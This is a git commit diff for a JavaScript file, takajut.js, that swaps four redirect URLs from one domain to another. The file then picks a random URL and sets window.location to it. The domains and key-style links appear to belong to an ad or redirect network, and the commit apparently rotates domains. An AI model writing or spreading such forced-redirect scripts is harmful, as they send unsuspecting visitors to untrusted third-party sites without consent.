2d92acf3136938051a1fba102000ad7dd4af34a2
inisialjurawa <84512688+inisialjurawa@users.noreply.github.com>
2021-09-04 09:03:26 +0800

    Update takajut.js

--- takajut.js
+++ takajut.js
@@ -12,10 +12,10 @@ var dataUrl = [
 '//wonderfullytumultbizarre.com/uqf9166i4v?key=6863b7b7d27f7caf1b440a90c37c2ffb',
 '//wonderfullytumultbizarre.com/ciwpm0hb7q?key=7f0434e3ed63cbba143ee2860b19fd5a',
 '//sergeantunhealthy.com/jdh7sy92?key=678ee6ec00a7dbcc74458748c5cbaa1f',
-'//capriceprop.com/p7wmzw69b6?key=8805a733dfbadc5f61cfab21de124b2a',
-'//capriceprop.com/dug7h0p8?key=aae9ffd149babf83a81f2c0eab30300f',
-'//capriceprop.com/jgh102dr2?key=294998ba132dc55926b6299c93ebf70f',
-'//capriceprop.com/jbjxyg1z?key=4de9306964f4da59cc607f8c3b7a1be0'
+'//goshbiopsy.com/p7wmzw69b6?key=8805a733dfbadc5f61cfab21de124b2a',
+'//goshbiopsy.com/dug7h0p8?key=aae9ffd149babf83a81f2c0eab30300f',
+'//goshbiopsy.com/jgh102dr2?key=294998ba132dc55926b6299c93ebf70f',
+'//goshbiopsy.com/jbjxyg1z?key=4de9306964f4da59cc607f8c3b7a1be0'
 ];
 var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
 window.location = randomItem;
